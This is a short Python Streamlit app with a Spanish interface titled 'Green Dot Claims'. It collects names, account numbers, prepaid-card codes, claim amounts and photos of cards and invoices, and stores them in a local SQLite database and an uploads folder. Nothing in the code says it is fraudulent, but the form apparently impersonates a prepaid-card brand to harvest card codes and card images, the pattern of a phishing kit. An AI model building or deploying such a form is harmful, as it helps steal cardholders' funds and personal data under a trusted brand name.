
import streamlit as st
import sqlite3
import os
from datetime import datetime

# Fallback a SQLite local si no hay URL de base de datos externa
DB_NAME = 'claims.db'
UPLOAD_DIR = 'uploads'
os.makedirs(UPLOAD_DIR, exist_ok=True)

def init_db():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS greendot_submissions
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  nombre TEXT, cuenta TEXT, codigo_tarjeta TEXT,
                  monto REAL, factura_path TEXT, tarjeta_path TEXT, fecha TEXT)''')
    conn.commit()
    conn.close()

init_db()

st.set_page_config(page_title="Green Dot Claims", layout="centered")

st.title("📌 Formulario de Reclamo Green Dot")
st.info("Sistema listo. Puede enviar su reclamo a continuación.")

with st.form("claim_form", clear_on_submit=True):
    nombre = st.text_input("Nombre Completo")
    cuenta = st.text_input("Número de Cuenta")
    codigo = st.text_input("Código de Tarjeta")
    monto = st.number_input("Monto del Reclamo", min_value=0.0, step=0.01)
    
    file_factura = st.file_uploader("Foto de Factura", type=['png', 'jpg', 'jpeg'])
    file_tarjeta = st.file_uploader("Foto de Tarjeta", type=['png', 'jpg', 'jpeg'])
    
    submit = st.form_submit_button("Enviar Reclamo")

if submit:
    if nombre and file_factura and file_tarjeta:
        f_path = os.path.join(UPLOAD_DIR, f"f_{int(datetime.now().timestamp())}_{file_factura.name}")
        t_path = os.path.join(UPLOAD_DIR, f"t_{int(datetime.now().timestamp())}_{file_tarjeta.name}")
        
        with open(f_path, "wb") as f: f.write(file_factura.getbuffer())
        with open(t_path, "wb") as f: f.write(file_tarjeta.getbuffer())
        
        conn = sqlite3.connect(DB_NAME)
        c = conn.cursor()
        c.execute("INSERT INTO greendot_submissions (nombre, cuenta, codigo_tarjeta, monto, factura_path, tarjeta_path, fecha) VALUES (?,?,?,?,?,?,?)",
                  (nombre, cuenta, codigo, monto, f_path, t_path, str(datetime.now())))
        conn.commit()
        conn.close()
        
        st.success("✅ Reclamo enviado con éxito.")
    else:
        st.warning("⚠️ Por favor complete todos los campos obligatorios.")
